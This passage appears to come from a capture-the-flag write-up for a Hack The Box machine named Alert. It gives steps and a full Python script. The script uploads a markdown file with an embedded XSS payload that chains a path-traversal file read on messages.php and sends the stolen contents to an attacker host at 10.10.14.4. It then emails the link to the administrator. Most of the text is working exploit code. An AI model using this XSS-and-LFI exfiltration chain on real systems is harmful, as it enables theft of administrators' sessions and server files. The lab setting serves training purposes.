to start, i used a page that is known to me as a user, so should be known to the admin as well. chances are it might reveal a reference to another portal/href too. the steps for doing this are:

```
- create a markdown file with the following javascript:
    1. get the current page
    2. fetch a known page like http://alert.htb/index.php?page=about and save the response text
    3. fetch the flask api.py application's /content URI with the response text in step 2 as the GET parameter content
- upload and view the markdown file using the Markdown Viewer
- get the link to the markdown using the Share Markdown button
- send an email to the administrator via the Contact Us page. the message should contain the markdown link
```

```
$ cat all_together.py 
import requests
import argparse
import sys
from bs4 import BeautifulSoup

proxies = { "http" : "http://127.0.0.1:8080" }

parser = argparse.ArgumentParser(
        epilog='ex: python {} -u http://alert.htb -f /etc/passwd'.format(sys.argv[0]))

parser.add_argument('-u', '--url', required=True, help='url')
parser.add_argument('-f', '--filepath', required=True, help='file to view')
args = parser.parse_args()

url = args.url
f_path = args.filepath

xss_str = "<!-- XSS with regular tags -->\n<script>\nbody = document.getElementsByTagName('body')[0];\nfetch(\"http://alert.htb/messages.php?file=LFI\", {credentials: \"include\", method: \"GET\"}).then((response) => { return response.text()}).then(function(text) {fetch(\"http://10.10.14.4/content?content=\"+encodeURIComponent(text), { headers: {\"Content-Type\": \"application/x-www-form-urlencoded\"}, method: \"GET\"});});\n</script>"

lfi_str = xss_str.replace("LFI", "../../../../..{}".format(f_path))
f = open("tmp.md", "w+")
f.write(lfi_str)
f.close()

print("[*] creating markdown with request for {} file".format(f_path))

file = {'file' : ('xss_simple.md', open('tmp.md', 'r'), 'text/markdown')}
r = requests.post("{}/visualizer.php".format(url), proxies=proxies, files=file)

# parse the link
bs = BeautifulSoup(r.content, 'html.parser')
md_link = bs.find("a").get("href")

print("[*] md link : {}".format(md_link))

# send email
data = {"email": "test@email.com",
        "message": md_link }

r = requests.post("{}/contact.php".format(url), proxies=proxies, data=data)
print("[+] email sent! check response")
```
